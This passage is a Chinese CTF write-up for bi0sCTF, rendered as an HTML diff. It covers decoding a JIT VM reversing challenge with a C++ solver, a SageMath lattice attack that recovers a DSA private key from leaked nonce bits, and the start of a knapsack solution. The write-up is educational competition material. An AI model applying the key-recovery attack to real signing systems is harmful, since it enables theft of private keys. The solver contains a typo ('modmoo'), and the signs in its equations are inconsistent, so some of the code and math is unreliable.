+<span class="hljs-built_in">    0x30,</span> <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x30, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x3D, <span class="hljs-number">3</span>, 
+<span class="hljs-built_in">    0x30,</span> <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x30, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x31, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x3D, <span class="hljs-number">3</span>,
+<span class="hljs-built_in">     
+    0x3E,</span> <span class="hljs-number">0</span>x36, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x36, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x36, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x36, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x40
+]</code></pre><p>每个指令的执行方式为生成对应的汇编函数</p>
+<p>在执行前向栈中压入了14个数</p>
+<p><code>0x35, 0x00: v13 *= v13</code></p>
+<p><code>0x35, 0x03: v13 *= list[i]</code> list为函数中定义的数组，i为0x35, 0x03调用次数</p>
+<p>0x3e表示将v13压栈，v13指向栈中下一个数据</p>
+<p>所以前面一部分的逻辑如下：</p>
+<pre class="hljs"><code><span class="hljs-comment"># 0x35, 0, 0x35, 3, 0x3E, </span>
+<span class="hljs-attribute">v13</span> = f<span class="hljs-number">1</span>
+<span class="hljs-attribute">v13</span> *= v<span class="hljs-number">13</span>
+<span class="hljs-attribute">v13</span> *= <span class="hljs-number">4</span>
+<span class="hljs-attribute">stack</span>.append(v<span class="hljs-number">13</span>) # f<span class="hljs-number">1</span> * f<span class="hljs-number">1</span> * <span class="hljs-number">4</span>
+
+<span class="hljs-comment"># 0x35, 3, 0x35, 3, 0x3E, </span>
+<span class="hljs-attribute">v13</span> = stack[<span class="hljs-number">1</span>]
+<span class="hljs-attribute">v13</span> *= f<span class="hljs-number">2</span>
+<span class="hljs-attribute">v13</span> *= <span class="hljs-number">5</span>
+<span class="hljs-attribute">stack</span>.append(v<span class="hljs-number">13</span>) # f<span class="hljs-number">1</span> * f<span class="hljs-number">2</span> * <span class="hljs-number">5</span> 
+
+<span class="hljs-comment"># 0x35, 3, 0x3E,</span>
+<span class="hljs-attribute">v13</span> = stack[<span class="hljs-number">2</span>]
+<span class="hljs-attribute">v13</span> *= <span class="hljs-number">105</span>
+<span class="hljs-attribute">stack</span>.append(v<span class="hljs-number">13</span>) # f<span class="hljs-number">1</span> * <span class="hljs-number">105</span>
+
+<span class="hljs-comment"># 0x35, 3, 0x3E, </span>
+<span class="hljs-attribute">v13</span> = stack[<span class="hljs-number">3</span>]
+<span class="hljs-attribute">v13</span> *= <span class="hljs-number">6</span>
+<span class="hljs-attribute">stack</span>.append(v<span class="hljs-number">13</span>) # f<span class="hljs-number">2</span> * <span class="hljs-number">6</span>
+
+<span class="hljs-comment"># 0x35, 0, 0x35, 3, 0x3E, </span>
+<span class="hljs-attribute">v13</span> = stack[<span class="hljs-number">4</span>]
+<span class="hljs-attribute">v13</span> *= v<span class="hljs-number">13</span>
+<span class="hljs-attribute">v13</span> *= <span class="hljs-number">2</span>
+<span class="hljs-attribute">stack</span>.append(v<span class="hljs-number">13</span>) # f<span class="hljs-number">1</span> * f<span class="hljs-number">1</span> * <span class="hljs-number">2</span>
+
+<span class="hljs-comment"># 0x35, 3, 0x3E, </span>
+<span class="hljs-attribute">v13</span> = stack[<span class="hljs-number">5</span>]
+<span class="hljs-attribute">v13</span> *= <span class="hljs-number">13</span>
+<span class="hljs-attribute">stack</span>.append(v<span class="hljs-number">13</span>) # f<span class="hljs-number">2</span> * <span class="hljs-number">13</span>
+
+<span class="hljs-comment"># 0x35, 3, 0x3E, </span>
+<span class="hljs-attribute">v13</span> = stack[<span class="hljs-number">6</span>]
+<span class="hljs-attribute">v13</span> *= <span class="hljs-number">17</span>
+<span class="hljs-attribute">stack</span>.append(v<span class="hljs-number">13</span>) # f<span class="hljs-number">1</span> * <span class="hljs-number">17</span>
+
+<span class="hljs-comment"># 0x35, 3, 0x35, 3, 0x3E, </span>
+<span class="hljs-attribute">v13</span> = stack[<span class="hljs-number">7</span>]
+<span class="hljs-attribute">v13</span> *= f<span class="hljs-number">3</span>
+<span class="hljs-attribute">v13</span> *= <span class="hljs-number">5</span>
+<span class="hljs-attribute">stack</span>.append(v<span class="hljs-number">13</span>) # f<span class="hljs-number">2</span> * f<span class="hljs-number">3</span> * <span class="hljs-number">5</span>
+
+<span class="hljs-comment"># 0x35, 0, 0x35, 3, 0x3E,</span>
+<span class="hljs-attribute">v13</span> = stack[<span class="hljs-number">8</span>]
+<span class="hljs-attribute">v13</span> *= v<span class="hljs-number">13</span>
+<span class="hljs-attribute">v13</span> *= <span class="hljs-number">5</span>
+<span class="hljs-attribute">stack</span>.append(v<span class="hljs-number">13</span>) # f<span class="hljs-number">2</span> * f<span class="hljs-number">2</span> * <span class="hljs-number">5</span>
+
+<span class="hljs-comment"># 0x35, 3, 0x3E, </span>
+<span class="hljs-attribute">v13</span> = stack[<span class="hljs-number">9</span>]
+<span class="hljs-attribute">v13</span> *= <span class="hljs-number">105</span>
+<span class="hljs-attribute">stack</span>.append(v<span class="hljs-number">13</span>) # f<span class="hljs-number">3</span> * <span class="hljs-number">105</span>
+
+<span class="hljs-comment"># 0x35, 3, 0x35, 3, 0x3E, </span>
+<span class="hljs-attribute">v13</span> = stack[<span class="hljs-number">10</span>]
+<span class="hljs-attribute">v13</span> *= f<span class="hljs-number">3</span>
+<span class="hljs-attribute">v13</span> *= <span class="hljs-number">4</span>
+<span class="hljs-attribute">stack</span>.append(v<span class="hljs-number">13</span>) # f<span class="hljs-number">4</span> * f<span class="hljs-number">3</span> * <span class="hljs-number">4</span>
+
+<span class="hljs-comment"># 0x35, 0, 0x35, 3, 0x3E, </span>
+<span class="hljs-attribute">v13</span> = stack[<span class="hljs-number">11</span>]
+<span class="hljs-attribute">v13</span> *= v<span class="hljs-number">13</span>
+<span class="hljs-attribute">v13</span> *= <span class="hljs-number">5</span>
+<span class="hljs-attribute">stack</span>.append(v<span class="hljs-number">13</span>) # f<span class="hljs-number">3</span> * f<span class="hljs-number">3</span> * <span class="hljs-number">5</span>
+
+<span class="hljs-comment"># 0x35, 3, 0x3E, </span>
+<span class="hljs-attribute">v13</span> = stack[<span class="hljs-number">12</span>]
+<span class="hljs-attribute">v13</span> *= <span class="hljs-number">303</span>
+<span class="hljs-attribute">stack</span>.append(v<span class="hljs-number">13</span>) # f<span class="hljs-number">4</span> * <span class="hljs-number">303</span>
+<span class="hljs-attribute">v13</span> = stack[<span class="hljs-number">13</span>]</code></pre><p>随后根据栈中的计算结果，进一步计算出四个结果</p>
+<p><code>0x30 0x00 0x03</code> 表示 <code>pop rax; pop rbx; add rax, rbx</code></p>
+<p><code>0x31 0x00 0x03</code> 表示 <code>pop rax; pop rbx; sub rax, rbx</code></p>
+<p>0x3d则将上述计算结果取模并存入一个单独数组</p>
+<pre class="hljs"><code><span class="hljs-built_in">rax</span> = stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>()
+<span class="hljs-built_in">rbx</span> = stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>()
+stack<span class="hljs-number">.</span>append(<span class="hljs-built_in">rax</span> + <span class="hljs-built_in">rbx</span>)
+# f4 * <span class="hljs-number">303</span> + f3 * f3 * <span class="hljs-number">5</span>
+<span class="hljs-built_in">rax</span> = stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>()
+<span class="hljs-built_in">rbx</span> = stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>()
+stack<span class="hljs-number">.</span>append(<span class="hljs-built_in">rax</span> - <span class="hljs-built_in">rbx</span>)
+# f4 * <span class="hljs-number">303</span> + f3 * f3 * <span class="hljs-number">5</span> - f4 * f3 * <span class="hljs-number">4</span>
+res = []
+res<span class="hljs-number">.</span>append(stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>() % dword_5220)
+
+<span class="hljs-built_in">rax</span> = stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>()
+<span class="hljs-built_in">rbx</span> = stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>()
+stack<span class="hljs-number">.</span>append(<span class="hljs-built_in">rax</span> + <span class="hljs-built_in">rbx</span>)
+# f3 * <span class="hljs-number">105</span> + f2 * f2 * <span class="hljs-number">5</span>
+<span class="hljs-built_in">rax</span> = stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>()
+<span class="hljs-built_in">rbx</span> = stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>()
+stack<span class="hljs-number">.</span>append(<span class="hljs-built_in">rax</span> - <span class="hljs-built_in">rbx</span>)
+# f3 * <span class="hljs-number">105</span> + f2 * f2 * <span class="hljs-number">5</span> - f2 * f3 * <span class="hljs-number">5</span>
+res = []
+res<span class="hljs-number">.</span>append(stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>() % dword_5220)
+
+<span class="hljs-built_in">rax</span> = stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>()
+<span class="hljs-built_in">rbx</span> = stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>()
+stack<span class="hljs-number">.</span>append(<span class="hljs-built_in">rax</span> - <span class="hljs-built_in">rbx</span>)
+
+<span class="hljs-built_in">rax</span> = stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>()
+<span class="hljs-built_in">rbx</span> = stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>()
+stack<span class="hljs-number">.</span>append(<span class="hljs-built_in">rax</span> - <span class="hljs-built_in">rbx</span>)
+# f1 * <span class="hljs-number">17</span> - f2 * <span class="hljs-number">13</span> - f1 * f1 * <span class="hljs-number">2</span>
+res = []
+res<span class="hljs-number">.</span>append(stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>() % dword_5220)
+
+<span class="hljs-built_in">rax</span> = stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>()
+<span class="hljs-built_in">rbx</span> = stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>()
+stack<span class="hljs-number">.</span>append(<span class="hljs-built_in">rax</span> - <span class="hljs-built_in">rbx</span>)
+
+<span class="hljs-built_in">rax</span> = stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>()
+<span class="hljs-built_in">rbx</span> = stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>()
+stack<span class="hljs-number">.</span>append(<span class="hljs-built_in">rax</span> - <span class="hljs-built_in">rbx</span>)
+
+<span class="hljs-built_in">rax</span> = stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>()
+<span class="hljs-built_in">rbx</span> = stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>()
+stack<span class="hljs-number">.</span>append(<span class="hljs-built_in">rax</span> + <span class="hljs-built_in">rbx</span>)
+# f2 * <span class="hljs-number">6</span> - f1 * <span class="hljs-number">105</span> - f1 * f2 * <span class="hljs-number">5</span> + f1 * f1 * <span class="hljs-number">4</span>
+res = []
+res<span class="hljs-number">.</span>append(stack<span class="hljs-number">.</span><span class="hljs-keyword">pop</span>() % dword_5220)</code></pre><p>第三部分将结果与此前定义的数字做对比</p>
+<p>整体加密过程为：</p>
+<pre class="hljs"><code>((<span class="hljs-built_in">f4</span> * <span class="hljs-number">303</span> + <span class="hljs-built_in">f3</span> * <span class="hljs-built_in">f3</span> * <span class="hljs-number">5</span> - <span class="hljs-built_in">f4</span> * <span class="hljs-built_in">f3</span> * <span class="hljs-number">4</span>) ) % mask == <span class="hljs-number">0x11226D6A</span>
+((<span class="hljs-built_in">f3</span> * <span class="hljs-number">105</span> + <span class="hljs-built_in">f2</span> * <span class="hljs-built_in">f2</span> * <span class="hljs-number">5</span> - <span class="hljs-built_in">f2</span> * <span class="hljs-built_in">f3</span> * <span class="hljs-number">5</span>) ) % mask == <span class="hljs-number">0x68E54823</span>
+((<span class="hljs-built_in">f1</span> * <span class="hljs-number">17</span> + <span class="hljs-built_in">f2</span> * <span class="hljs-number">13</span> + <span class="hljs-built_in">f1</span> * <span class="hljs-built_in">f1</span> * <span class="hljs-number">2</span>) ) % mask == <span class="hljs-number">0x34CC1889</span>
+((<span class="hljs-built_in">f2</span> * <span class="hljs-number">6</span> + <span class="hljs-built_in">f1</span> * <span class="hljs-number">105</span> + <span class="hljs-built_in">f1</span> * <span class="hljs-built_in">f2</span> * <span class="hljs-number">5</span> - <span class="hljs-built_in">f1</span> * <span class="hljs-built_in">f1</span> * <span class="hljs-number">4</span>) ) % mask == <span class="hljs-number">0x1EF6E9EB</span></code></pre><p>通过数学化简后爆破f1求解</p>
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
+<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
+<span class="hljs-keyword">using</span> ll = <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>;
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">power</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> k, <span class="hljs-keyword">int</span> mod)</span> </span>{
+  <span class="hljs-keyword">int</span> ret = <span class="hljs-number">1</span>;
+  <span class="hljs-keyword">for</span> (; k; k &gt;&gt;= <span class="hljs-number">1</span>, a = <span class="hljs-number">1ll</span> * a * a % mod) <span class="hljs-keyword">if</span> (k&amp;<span class="hljs-number">1</span>) ret = <span class="hljs-number">1ll</span> * ret * a % mod;
+  <span class="hljs-keyword">return</span> ret;
+}
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
+  <span class="hljs-keyword">int</span> mod = <span class="hljs-number">0x7EFF4B91</span>;
+  <span class="hljs-keyword">int</span> res0 = <span class="hljs-number">0x11226D6A</span>;
+  <span class="hljs-keyword">int</span> res1 = <span class="hljs-number">0x68E54823</span>;
+  <span class="hljs-keyword">int</span> res2 = <span class="hljs-number">0x34CC1889</span>;
+  <span class="hljs-keyword">int</span> res3 = <span class="hljs-number">0x1EF6E9EB</span>;
+  <span class="hljs-keyword">int</span> inv13 = <span class="hljs-built_in">power</span>(<span class="hljs-number">13</span>, mod - <span class="hljs-number">2</span>, mod);
+  
+  <span class="hljs-keyword">for</span> (ll f1 = <span class="hljs-number">0</span>; f1 &lt; INT_MAX; ++f1) {
+    ll f2 = ((res2 - f1 * <span class="hljs-number">17</span> - f1 * f1 % mod * <span class="hljs-number">2</span>) % mod * inv13) % mod;
+    <span class="hljs-keyword">if</span> (((f2 * <span class="hljs-number">6</span> + f1 * <span class="hljs-number">105</span> + f1 * f2 % mod * <span class="hljs-number">5</span> - f1 * f1 % mod * <span class="hljs-number">4</span>) % mod + mod) % mod == res3) {
+      f2 = (f2 + mod) % modmoo;
+      <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> tf1 = f1, tf2 = f2;
+      <span class="hljs-keyword">if</span> ((tf1 * <span class="hljs-number">17</span> + tf2 * <span class="hljs-number">13</span> + tf1 * tf1 * <span class="hljs-number">2</span>) % mod != res2) <span class="hljs-keyword">continue</span>;
+      <span class="hljs-keyword">if</span> (((tf2 * <span class="hljs-number">6</span> + tf1 * <span class="hljs-number">105</span> + tf1 * tf2 * <span class="hljs-number">5</span> - tf1 * tf1 * <span class="hljs-number">4</span>) % mod + mod) % mod != res3) <span class="hljs-keyword">continue</span>;
+      ll x = ((res1 - f2 * f2 % mod * <span class="hljs-number">5</span>) % mod + mod) % mod;
+      ll y = ((<span class="hljs-number">105</span> - f2 * <span class="hljs-number">5</span>) % mod + mod) % mod;
+      y = <span class="hljs-built_in">power</span>(y, mod<span class="hljs-number">-2</span>, mod);
+      ll f3 = (x * y % mod + mod) % mod;
+      x = (res0 - f3 * f3 % mod * <span class="hljs-number">5</span>) % mod;
+      y = (<span class="hljs-number">303</span> - f3 * <span class="hljs-number">4</span>) % mod;
+      y = <span class="hljs-built_in">power</span>(y, mod<span class="hljs-number">-2</span>, mod);
+      ll f4 = (x * y % mod + mod) % mod;
+      <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> tf3 = f3, tf4 = f4;
+      <span class="hljs-keyword">if</span> (((tf4 * <span class="hljs-number">303</span> + tf3 * tf3 * <span class="hljs-number">5</span> - tf4 * tf3 * <span class="hljs-number">4</span>) % mod + mod) % mod != res0) <span class="hljs-keyword">continue</span>;
+      <span class="hljs-keyword">if</span> (((tf3 * <span class="hljs-number">105</span> + tf2 * tf2 * <span class="hljs-number">5</span> - tf2 * tf3 * <span class="hljs-number">5</span>) % mod + mod) % mod != res1) <span class="hljs-keyword">continue</span>;
+      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld %lld %lld %lld\n&quot;</span>, f1, f2, f3, f4);
+    }
+  }
+  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre><p>之后拿到<code>1953066341 1818325107 1768843103 1785295997</code></p>
+<p>然后利用n2s去解</p>
+<pre class="hljs"><code><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-keyword">import</span> libnum</span>
+<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-string">b&quot;bi0sCTF{&quot;</span>+libnum.n2s(<span class="hljs-number">1953066341</span>)+libnum.n2s(<span class="hljs-number">1818325107</span>)+libnum.n2s(<span class="hljs-number">1768843103</span>)+libnum.n2s(<span class="hljs-number">1785295997</span>)</span>
+b&#x27;bi0sCTF{timelapsing_jit}&#x27;</code></pre><h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto:</h2>
+<h3 id="leaky-dsa"><a class="header-link" href="#leaky-dsa"></a>Leaky-dsa:</h3>
+<p>k未知信息较少，直接用两条 sk=m-rd %p 消掉d，之后二元copper求出来对应每个k具体是多少，接着回代任何一条式子求出私钥d即可。</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> itertools
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">small_roots</span>(<span class="hljs-params">f, bounds, m=<span class="hljs-number">1</span>, d=<span class="hljs-literal">None</span></span>):</span>
+    
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> d:
+        d = f.degree()
+
+    R = f.base_ring()
+    N = R.cardinality()
+    
+    f /= f.coefficients().pop(<span class="hljs-number">0</span>)
+    f = f.change_ring(ZZ)
+
+    G = <span class="hljs-type">Sequence</span>([], f.parent())
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m+<span class="hljs-number">1</span>):
+        base = N**(m-i) * f**i
+        <span class="hljs-keyword">for</span> shifts <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(d), repeat=f.nvariables()):
+            g = base * prod(<span class="hljs-built_in">map</span>(power, f.variables(), shifts))
+            G.append(g)
+
+    B, monomials = G.coefficient_matrix()
+    monomials = vector(monomials)
+
+    factors = [monomial(*bounds) <span class="hljs-keyword">for</span> monomial <span class="hljs-keyword">in</span> monomials]
+    <span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):
+        B.rescale_col(i, factor)
+
+    B = B.dense_matrix().LLL()
+
+    B = B.change_ring(QQ)
+    <span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):
+        B.rescale_col(i, <span class="hljs-number">1</span>/factor)
+
+    H = <span class="hljs-type">Sequence</span>([], f.parent().change_ring(QQ))
+    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">filter</span>(<span class="hljs-literal">None</span>, B*monomials):
+        H.append(h)
+        I = H.ideal()
+        <span class="hljs-keyword">if</span> I.dimension() == -<span class="hljs-number">1</span>:
+            H.pop()
+        <span class="hljs-keyword">elif</span> I.dimension() == <span class="hljs-number">0</span>:
+            roots = []
+            <span class="hljs-keyword">for</span> root <span class="hljs-keyword">in</span> I.variety(ring=ZZ):
+                root = <span class="hljs-built_in">tuple</span>(R(root[var]) <span class="hljs-keyword">for</span> var <span class="hljs-keyword">in</span> f.variables())
+                roots.append(root)
+            <span class="hljs-keyword">return</span> roots
+
+    <span class="hljs-keyword">return</span> []
+
+p = <span class="hljs-number">115792089210356248762697446949407573529996955224135760342422259061068512044369</span>
+<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256
+z0, r0, s0, k0upper = (<span class="hljs-number">7496648251275913379321762834259461106413066198251568863972241549518064825045</span>, <span class="hljs-number">35708720267216780141386972017638777589648610471064977388051210664743651182375</span>, <span class="hljs-number">9662179038519615060061698799209221467470247302473971588084625796487341336154</span>, <span class="hljs-number">95052095029311712302690948913953984379788450191371396826510415254434210643968</span>)<span class="hljs-comment"># (30338807469659243526067570717263914107109404131145581381962141065570542682259, 43851411654896912189138312109624484265004182982926637890370600465748239140223, 106481291664766764647716317252159351590989262652905730138893713822745324775435, 81230974975392412240328835818144420434492415594227637683334578249558160048128)</span>
+z1, r1, s1 ,k1upper = (<span class="hljs-number">111835103479967511801273161109097060425429270142914837192258803061862468767340</span>, <span class="hljs-number">58501386591257759132453271402849092080165690028881563872587436596762908386517</span>, <span class="hljs-number">25627184742160112142369942661671203533076276538669251446198338686442020839709</span>, <span class="hljs-number">9183002560293761939923713800050215778090209618706208942684718339054572142592</span>)<span class="hljs-comment"># (51244276794475006764734096639881124571891948637729294101379411867362632631294, 36750292731574219885284236746359615855307648761830525593472443690459194965250, 88055573187005285998775508217321157018762308369537667398558614085325414799653, 4650611669265657333998771183266096645438495825074800915291751302057284337664)</span>
+PR.&lt;k0lower,k1lower&gt; = PolynomialRing(Zmod(p))
+
+f = r1*s0*(k0upper+k0lower) - r0*s1*(k1upper+k1lower) - (z0*r1 - z1*r0)
+k0lower,k1lower = small_roots(f,[<span class="hljs-number">2</span>^<span class="hljs-number">128</span>,<span class="hljs-number">2</span>^<span class="hljs-number">128</span>],m=<span class="hljs-number">3</span>,d=<span class="hljs-number">4</span>)[<span class="hljs-number">0</span>]</code></pre><h3 id="bad2code"><a class="header-link" href="#bad2code"></a>bad2code:</h3>
+<p>一看是背包，一开始没给r，以为要恢复r或者直接copper，后来给了，%等于没%，直接求二进制之后逆encrypt即可 需要hnp</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *
+
+public = [<span class="hljs-number">1</span>]
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">91</span>):
+    public.append(public[-<span class="hljs-number">1</span>]*i)
+q = <span class="hljs-built_in">sum</span>(public)
+public = public[::-<span class="hljs-number">1</span>]
+r = <span class="hljs-number">439336960671443073145803863477</span>
+ct =  [(<span class="hljs-number">85</span>, <span class="hljs-number">2009755672435753240933297922620729942110285100089234834611189610638944428122270966606450209287004686147490741726074233399923807772025455384</span>), (<span class="hljs-number">87</span>, <span class="hljs-number">4996607263053501712119670315411210635641476911112656716346186101581162098939506206462698692878856867719374177604968008598982986859155008123</span>), (<span class="hljs-number">87</span>, <span class="hljs-number">4837953870616520482139098354277306810171956043791834010204071803405678054968703256907153189059041329376000508442178425613919361101370091597</span>), (<span class="hljs-number">87</span>, <span class="hljs-number">2933251583165904105425041103443198171501175581919361545836839336222902826332690613281372817019459906816365925875888304559050438360535693754</span>), (<span class="hljs-number">87</span>, <span class="hljs-number">3687643521316276110350069295074808763624177150637370283489602776297956670406673088896906135313859622547057266461156951352840606158133939326</span>), (<span class="hljs-number">85</span>, <span class="hljs-number">1338269001646504891852362627714857562957599731250242281507737655117481275381522940187354460968741738873145343823622277547003496172474140929</span>), (<span class="hljs-number">88</span>, <span class="hljs-number">7933296831307546148859657742504382496951023270916400508699917815337497611045057441275885597739792345698682705664067022591023419704320903682</span>), (<span class="hljs-number">88</span>, <span class="hljs-number">5551940689407978486506000896917506389553250109195458521661213619690861850998613004330276887098156130761269810440548744569924180624922795113</span>), (<span class="hljs-number">84</span>, <span class="hljs-number">4231118499738387243085586897653540321361890016337481573279774741827125072054069869204040621495890626440611926639348835434382399384680055422</span>), (<span class="hljs-number">85</span>, <span class="hljs-number">4704615409370307656606356674605132679559694819773906599372238093928995241862651680281288235856744305731307534075261385839804274777809615349</span>), (<span class="hljs-number">88</span>, <span class="hljs-number">8080256207998531514821351856269697662773084407605094205301308544428843939544685672982309353297946702140050231399104513874885470725033197665</span>), (<span class="hljs-number">88</span>, <span class="hljs-number">5409126049900711181553897969759692389994841569000620092514718715454021797905578507700126871105210241868943216288008246115824215988452628610</span>), (<span class="hljs-number">87</span>, <span class="hljs-number">9252119153621946581189075112355267174890952393437560488066048810424246555795717704306898381332924931192879341998003358581626937969846419514</span>), (<span class="hljs-number">88</span>, <span class="hljs-number">4309485343027874993328683769447337855319861832898927390313412221773647599911173732334028315977555272520439642698050646195173212678056296824</span>), (<span class="hljs-number">87</span>, <span class="hljs-number">7585821393024154059281324167310518147335428246416250953866063679865301977430635054486170591035445789330984486529581273451159109931487791502</span>), (<span class="hljs-number">87</span>, <span class="hljs-number">4266559781861060657731014334455291598689251074723949797856286897802219958857948301662899795696748957745131495362941575798432727634477829169</span>), (<span class="hljs-number">85</span>, <span class="hljs-number">2641970821454174926450206596995181582610648509828849026215891906920020076919398240347027542452996819530972432115175678566086129470049375389</span>), (<span class="hljs-number">86</span>, <span class="hljs-number">3077438307667140950446795937461054813957511252383671895612002141778156796698300700433893422617209993376314581927862590976739430303756825799</span>), (<span class="hljs-number">84</span>, <span class="hljs-number">6606999799754153651147831000154190219518207430742825676139927743071667153908159445512098245423654757585044526053832363134210629951000894424</span>), (<span class="hljs-number">88</span>, <span class="hljs-number">5670578370066772514741437284311647297873639929831922637574590430528630079731096253156055423807240883352926044290617794045498770071653673648</span>), (<span class="hljs-number">87</span>, <span class="hljs-number">6894132144232319468740512750496837680809983881874187255032194645685827169634783788480774942267705885439820208999500465383743432841886297780</span>), (<span class="hljs-number">88</span>, <span class="hljs-number">6348559834296411797469331328911826454137045759724408730535584371919321718963812479226912064993936288733920150791627489465935504738729746712</span>), (<span class="hljs-number">87</span>, <span class="hljs-number">7457067309408071136462520290099813600595760616382451252266638576757556195357758384430233685566475045370258747830063483558129016033041534121</span>), (<span class="hljs-number">87</span>, <span class="hljs-number">7138834056650788599340304091245357448689914704543367476875970477848587821892811763578094466693024724929034161719556439516286550418480386826</span>), (<span class="hljs-number">85</span>, <span class="hljs-number">4214620981374285095640824086913124961419729602098347661701803957979165936606167686524401563099707189265200486482516005732059773306234258420</span>), (<span class="hljs-number">87</span>, <span class="hljs-number">7739066385937951930229094506964291860284170243142110190122036300802992602806430896564185899709833543891933679072444463084661529668059219104</span>), (<span class="hljs-number">86</span>, <span class="hljs-number">7996763147644153267931052506581385268378745125996592054161290689392831593366496210631236238142447646254463386914159791951904746842709666621</span>), (<span class="hljs-number">83</span>, <span class="hljs-number">2363927368088545362888027832425184786062409622322321649991521010872009124933023792724085312213031828468440431258319304817389205319949123017</span>), (<span class="hljs-number">86</span>, <span class="hljs-number">8952178949693065428977346330331508030115172989418887909205463101008773555390353195154597245789628940426095401145185560848927781578325104633</span>), (<span class="hljs-number">87</span>, <span class="hljs-number">5437733249052136209105079687557091961563919494484950700755430118355692330802405578709308644911805929080699188377572804834481019970451287210</span>), (<span class="hljs-number">88</span>, <span class="hljs-number">6015299972513982077146707497576267202666793107003902152334693697774096888512046451228148219477544391600946101222260160929679756603685952858</span>), (<span class="hljs-number">88</span>, <span class="hljs-number">4568852671731251436040898868989551602956632306950375030804513367391992286782270552341135397170272362552944089560054885656717064705695931608</span>), (<span class="hljs-number">88</span>, <span class="hljs-number">5214418374014497232007521802148945843762329611158152570151078790657020448385624421117820553224634987052518291618670107521494031262847423514</span>), (<span class="hljs-number">85</span>, <span class="hljs-number">4868781049816097655711690233312446779184038900364456479177916582789767967134191139603006712483609665048365174590374678749717762853252392898</span>), (<span class="hljs-number">87</span>, <span class="hljs-number">7487878378499555558388350908281092245535427011554302229088273963701472371659945154073798520163320208196872977374676841353329741664704431049</span>), (<span class="hljs-number">88</span>, <span class="hljs-number">4804650300297155317595282760599161747288241275410480931480258003053935686370721999717184367371623277273540661128542000775004283694728585525</span>), (<span class="hljs-number">87</span>, <span class="hljs-number">6324353155591926121419512579497192374524354396151314193997508188259969434627055717937503525281909856550845807173753553651932260148517039625</span>), (<span class="hljs-number">87</span>, <span class="hljs-number">5546469224661430242652418747991106002905180051710879985326544434722895447041925331360634907813012794515907098935485171653197695779005009826</span>), (<span class="hljs-number">86</span>, <span class="hljs-number">6493922061250196900387871627336695511599800586007321943800903718034500613505566204881495072235610494479661303981584755703237874004730700241</span>), (<span class="hljs-number">84</span>, <span class="hljs-number">3304267236247240014753455621608696126482869339445549240138779235284450054938719633292333925332195771054789798560540593262065547955691287860</span>), (<span class="hljs-number">86</span>, <span class="hljs-number">7470707627092056238764393981318045721888042683539521453158125764519328859948265999477619788387120366063077899885955739104933799243393828710</span>), (<span class="hljs-number">88</span>, <span 